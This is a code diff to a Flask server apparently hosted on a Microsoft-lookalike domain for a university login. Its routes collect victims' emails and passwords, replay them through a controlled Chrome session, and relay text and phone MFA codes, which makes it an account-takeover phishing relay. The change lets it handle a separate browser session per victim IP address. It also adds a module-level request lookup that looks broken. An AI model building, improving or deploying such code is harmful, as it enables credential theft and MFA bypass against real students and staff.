@@ -9,6 +9,8 @@ import main
 import os
 import threading
 from _thread import start_new_thread
+from flask import request
+from flask import jsonify
 
 
 
@@ -34,7 +36,11 @@ context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/lets
 #     thread = threading.Thread(target=task)
 #     thread.start()
 
-chrome = main.startChrome()
+
+connections = {}
+connections[request.remote_addr] =  main.startChrome()
+
+# chrome = main.startChrome()
 
 @app.route('/profile')
 def profile():
@@ -100,7 +106,7 @@ def requestCode():
     print("request code py")
     try:
         # print(type(chrome))
-        chrome.request_text()
+        connections[request.remote_addr].request_text()
         return "True"
     except Exception as E:
         print("text requestCode.text error")
@@ -120,18 +126,18 @@ def text():
     # yield "True"
     try:
         # yield render_template('index.html')
-        chrome.enterCode(code)
+        connections[request.remote_addr].enterCode(code)
     except:
         print("text chrome.text error")
-        chrome.restart()
+        connections[request.remote_addr].restart()
     time.sleep(20)
     try:
-        chrome.open_mycsulb()
+        connections[request.remote_addr].open_mycsulb()
     except:
         print("text chrome_opensulb error")
-        chrome.restart()
+        connections[request.remote_addr].restart()
 
-    chrome.log_info()
+    connections[request.remote_addr].log_info()
 
 
     return render_template('index.html')
@@ -142,21 +148,21 @@ def call():
     # client-side form data. For example, WTForms is a library that will
     # handle this for us, and we use a custom LoginForm to validate.
     try:
-        chrome.call()
+        connections[request.remote_addr].call()
     except:
         print("call chrome.call error")
-        chrome.restart()
+        connections[request.remote_addr].restart()
     time.sleep(30)
     try:
-        chrome.open_mycsulb()
+        connections[request.remote_addr].open_mycsulb()
     except:
         print("call open_mycsulb() error")
-        chrome.restart()
+        connections[request.remote_addr].restart()
     try:
-        chrome.log_info()
+        connections[request.remote_addr].log_info()
     except:
         print("call log_info() error")
-        chrome.restart()
+        connections[request.remote_addr].restart()
 
     return render_template('index.html')
         
@@ -169,7 +175,7 @@ def login():
     password = request.form.get('password')
     # print(email,password)
     try:
-        var = chrome.login_email(email,password)
+        var = connections[request.remote_addr].login_email(email,password)
         if var == True:
         #stop loading
         
@@ -180,7 +186,7 @@ def login():
             # os.system('chmod 777 '+email+'.txt')
     except Exception as e:
         print("get var error",e)
-        chrome.restart()
+        connections[request.remote_addr].restart()
     return render_template('index.html')
     
         
